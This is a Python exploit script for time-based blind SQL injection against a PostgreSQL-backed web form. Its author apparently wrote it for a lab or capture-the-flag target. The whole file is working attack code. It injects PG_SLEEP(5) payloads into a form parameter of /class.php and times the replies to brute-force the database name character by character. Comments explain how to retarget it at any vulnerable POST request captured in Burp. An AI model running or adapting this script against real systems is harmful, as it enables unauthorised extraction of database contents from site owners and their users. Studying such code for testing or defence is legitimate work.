import requests
import time
import sys


# ---------------------------------------------------------------
#   How to use:
#   Capture a vulnerable POST request in Burp
#   Change the endpoint to wherever the SQLi is ie. /index.php
#   Use the data being sent in the 'data' dictionary below and make sure the vulnerable parameter has the payload f string
# ---------------------------------------------------------------


# Send the payload to the vulnerable parameter on the target host
# If it takes 5 seconds or longer to get a reply, return True
def send_payload(ip, payload):
    url = f"http://{ip}/class.php"  # -----  CHANGE THIS ENDPOINT -----
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {
        'weight': '2',
        'height': f"2' AND 4230=(SELECT 4230 FROM PG_SLEEP(5) WHERE {payload})--",   # -----  CHANGE THESE PARAMETERS BUT KEEP THE PAYLOAD -----
        'age': '1',
        'gender': 'Male',
        'email': 'tom2@mail.com'
    }
    start = time.time()
    try:
        r = requests.post(url, headers=headers, data=data)
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return False
    end = time.time()
    return (end - start) >= 5


# Brute-force the length of the database
# Iterate to all possible letters and brute-force the name of the database
def brute_db(ip):
    length = 0
    for i in range(1, 100):  # Start from 1 to avoid zero-length check
        payload = f"length(current_database())={i}"
        if send_payload(ip, payload):
            length = i
            break
    print(f"Length: {length}")
    sys.stdout.write("Dumping: ")
    sys.stdout.flush()
    db_name = ""
    for i in range(1, length + 1):
        for j in range(32, 127):  # ASCII printable characters
            payload = f"substring(current_database() from {i} for 1)='{chr(j)}'"
            if send_payload(ip, payload):
                db_name += chr(j)
                sys.stdout.write(chr(j))
                sys.stdout.flush()
                break  # Move to the next character position once a match is found
    sys.stdout.write("\n")
    sys.stdout.flush()
    return db_name


def main():
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <ip>")
        sys.exit(1)
    ip = sys.argv[1]
    test = brute_db(ip)
    print(f"DB name: {test}")


if __name__ == "__main__":
    main()
